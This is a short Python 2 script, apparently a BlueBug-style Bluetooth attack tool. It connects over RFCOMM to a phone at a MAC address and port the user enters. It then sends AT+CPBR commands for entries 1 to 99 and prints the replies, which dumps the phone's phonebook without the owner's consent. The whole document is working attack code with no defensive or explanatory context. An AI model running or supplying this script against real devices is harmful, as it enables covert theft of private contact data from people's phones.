#-*- coding: utf-8 -*-
from bluetooth import *

def blueBug(mac, port):
    phoneSock=BluetoothSocket(RFCOMM)
    phoneSock.connect((mac, port))
    for i in range(1, 100):
        try:
            atCmd='AT+CPBR=' +str(i) +'\n'
            phoneSock.send(atCmd)
            result=phoneSock.recv(100)
            print '[+] ' + str(i) + ' : ' + str(result)
        except Exception, e:
            print "[-] ", e 
            pass
    phoneSock.close()
    
def main():
    mac=raw_input("Input Bluetooth Device Mac Address : ")
    port=raw_input("Input RFCOMM Port : ")
    blueBug(mac, int(port))
    
if __name__=="__main__":
    main()